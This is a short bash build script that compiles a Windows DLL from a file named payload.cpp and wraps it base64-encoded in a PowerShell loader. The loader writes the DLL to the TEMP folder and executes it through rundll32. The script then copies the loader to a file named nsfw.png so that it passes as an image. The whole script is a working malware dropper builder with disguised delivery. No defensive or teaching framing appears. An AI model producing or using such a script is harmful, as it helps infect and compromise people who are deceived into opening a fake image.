#!/bin/bash

DLL_NAME="payload.dll"
CPP_SRC="src/payload.cpp"
OUTPUT_PS="dist/loader.ps1"
FAKE_IMAGE="dist/nsfw.png"
DIST="dist"

mkdir -p "$DIST"
x86_64-w64-mingw32-g++ -shared -o "$DLL_NAME" -Wl,--subsystem,windows "$CPP_SRC"

python3 - <<EOF > "$OUTPUT_PS"
import base64
dll = open("$DLL_NAME", "rb").read()
encoded = base64.b64encode(dll).decode()
print(f"$data = '{encoded}'\n$bytes = [System.Convert]::FromBase64String($data)\n$path = \"$env:TEMP\\rdload.dll\"\n[IO.File]::WriteAllBytes($path, $bytes)\nStart-Process 'rundll32.exe' -ArgumentList \"$path,EntryPoint\"")
EOF

cp "$OUTPUT_PS" "$FAKE_IMAGE"
